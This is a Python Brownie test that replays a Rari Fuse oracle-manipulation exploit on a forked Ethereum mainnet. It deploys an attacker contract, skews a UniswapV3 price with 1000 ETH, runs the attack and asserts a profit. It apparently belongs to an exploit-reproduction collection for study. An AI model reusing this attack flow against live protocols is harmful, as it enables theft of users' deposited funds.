import time

import pytest
from brownie import accounts

from setup_fixtures import brownie_project, eth_fork_network

# 13537919 is 3 blocks before the attack happened. some buffer is required, because this exploit involves a contract
# which uses UniswapV3 prices as an oracle and brownies default behavior is to mine a block for every tx
# (deployment taking up one)
@pytest.mark.fork_blocknumber(13537919)
def test_hack(eth_fork_network, brownie_project):
    attacker_eoa = accounts[0]
    attacker_start_balance = attacker_eoa.balance()

    attacker_contract = brownie_project.RariFuseAttacker.deploy({'from': attacker_eoa})

    # used for debugging:
    # pool = brownie_project.interface.IUniswapV3Pool('0x8dDE0A1481b4A14bC1015A5a8b260ef059E9FD89')
    # print(pool.slot0())
    # print(attacker_contract.getSqrtPriceLimit())

    attacker_contract.manipulateUniswapV3({'from': attacker_eoa, 'value': eth_fork_network.web3.toWei(1000, 'ether')})

    time.sleep(30)

    attacker_contract.fuseAttack({'from': attacker_eoa})

    attacker_end_balance = attacker_eoa.balance()

    profit = (attacker_end_balance-attacker_start_balance)//10**18

    print(f'profit: {profit}')

    assert profit > 0

